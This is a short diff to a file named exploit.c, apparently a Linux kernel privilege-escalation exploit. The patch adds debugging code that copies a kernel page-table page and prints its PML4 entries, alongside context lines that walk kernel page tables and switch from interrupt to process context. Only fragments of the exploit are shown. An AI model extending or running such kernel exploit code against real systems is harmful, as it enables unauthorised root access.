@@ -1,0 +1,41 @@
+--- ../exploit.c	2013-05-25 13:20:15.000000000 -0400
++++ exploit.c	2013-05-25 13:52:00.000000000 -0400
+@@ -613,6 +613,7 @@ static inline unsigned long pte_to_kaddr
+ #define NUM_RANGES 32
+ 
+ static unsigned long valid_ranges[NUM_RANGES][2];
++static unsigned long thekernelpg[512];
+ 
+ /* elito #2 */
+ static inline void find_kernel_ranges(void)
+@@ -641,6 +642,7 @@ static inline void find_kernel_ranges(vo
+ 			break;
+ 		}
+ 	}
++
+ 	for (z = x; z <= i; z++) {
+ 		// large page
+ 		if ((kernelpg[z] & (1 << 7)) && !valid_ranges[rangeidx][0])
+@@ -648,6 +650,8 @@ static inline void find_kernel_ranges(vo
+ 		else if (!(kernelpg[z] & (1 << 7)) && !valid_ranges[rangeidx][0]) {
+ 			// check 4K pages
+ 			kernelpte = pg_to_ptr(kernelpg[z]);
++			memcpy(&thekernelpg, kernelpg, 512 * sizeof(unsigned long));
++
+ 			for (t = 0; t < 511; t++) {
+ 				if ((kernelpte[t] & 0x1) && !valid_ranges[rangeidx][0])
+ 					valid_ranges[rangeidx][0] = pte_to_kaddr(kernelpte[t]);
+@@ -1628,6 +1632,13 @@ repeat_it:
+ 		exit(0);
+ 	}
+ 
++	{
++		int z;
++		for (z = 0; z < 512; z++)
++			if (thekernelpg[z])
++				printf("pml4e[%d]=%p\n", z, thekernelpg[z]);
++	}
++
+ 	if (return_to_process_context == 2)
+ 		printf(" [+] Adjusted from interrupt handler to process context\n");
+ 	else if (return_to_process_context == 1)
